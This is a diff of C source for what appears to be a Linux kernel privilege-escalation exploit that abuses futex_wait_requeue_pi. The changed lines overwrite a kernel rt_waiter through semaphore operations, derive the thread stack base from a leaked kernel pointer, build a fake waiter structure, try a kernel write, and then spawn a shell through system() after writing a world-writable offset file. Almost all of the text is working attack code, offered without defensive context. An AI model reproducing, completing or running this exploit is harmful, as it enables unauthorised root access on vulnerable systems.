@@ -110,7 +110,8 @@ void *ger(void *arg){
 	printf("ger thread\n");
 
 	int fd = open("/dev/null", O_RDWR);
-
+	if(write(fd, (void*)(tbase+24), 8) < 0) printf("no kernel r/w... yet\n");
+	
 	setpriority(PRIO_PROCESS , 0, *(int*)arg);
 	
 	if ((sem_id = semget(IPC_PRIVATE,(WAITER_OVERWRITE_SIZE+WAITER_OVERWRITE_OFFSET)/2,IPC_CREAT | 0660)) < 0){
@@ -119,7 +120,7 @@ void *ger(void *arg){
 
 	// don't call anything else to prevent tainting rt_waiter
 	futex_wait_requeue_pi(&srcfutex, 0, &destfutex, NULL, 0);	
-   	semctl(sem_id,-1,SETALL,sem_values);
+   	semctl(sem_id,-1,SETALL,sem_values); // this is messi, find a syscall that blocks
 	while(!proceed_to_overwrite);
 	proceed_to_overwrite = 0;
    	semctl(sem_id,-1,SETALL,sem_values);
@@ -144,7 +145,7 @@ void *ger(void *arg){
 	sprintf(buf,"sh -c \"echo success %d > offset.txt && chmod 777 offset.txt && sh \"",WAITER_OVERWRITE_OFFSET);
 	system(buf);
 	
-	printf("ger function exiting\n");
+	printf("ger function exiting. your OS will lose it like Brazil\n");
 	return NULL;
 	
 }
@@ -248,8 +249,6 @@ int main(int argc, char **argv){
 	tbase = (unsigned long)kernel_waiter & 0xffffffffffffe000;
 
 	printf("found thread stack base: 0x%lx\n",tbase);
-
-	if(write(fd, (void*)(tbase+24), 8) < 0) printf("no kernel r/w... yet\n");
 
 	fake_userspace_waiter->tree_entry.rb_right = NULL;
 	fake_userspace_waiter->tree_entry.rb_left = NULL;
